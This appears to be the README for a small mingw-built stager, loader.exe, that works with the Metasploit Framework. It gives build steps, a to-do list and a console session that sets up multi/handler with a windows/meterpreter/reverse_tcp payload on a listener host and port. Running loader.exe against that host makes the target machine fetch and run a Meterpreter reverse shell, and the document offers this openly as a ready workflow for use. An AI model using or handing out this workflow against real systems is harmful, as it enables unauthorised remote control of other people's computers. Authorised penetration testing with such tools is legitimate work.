A quick stager client compatible with the Metasploit Framework

Reference:

1. http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
2. http://mail.metasploit.com/pipermail/framework/2012-September/008664.html

Use:

1. Start a multi/handler with your favorite windows reverse_tcp payload
2. Run: loader.exe [host] [port]

How to compile:

1. Install mingw
2. Edit build.bat if mingw is installed somewhere other than c:\mingw
3. run build.bat

ToDo:

1. 64-bit compatability (see message #2)
2. get a Windows build environment with make

How to use:
```
msf > use exploit/multi/handler 
msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf  exploit(handler) > set LPORT 31337
LPORT => 31337
msf  exploit(handler) > set LHOST 192.168.95.241
LHOST => 192.168.95.241
msf  exploit(handler) > exploit -j
```

loader.exe 192.168.95.241 31337
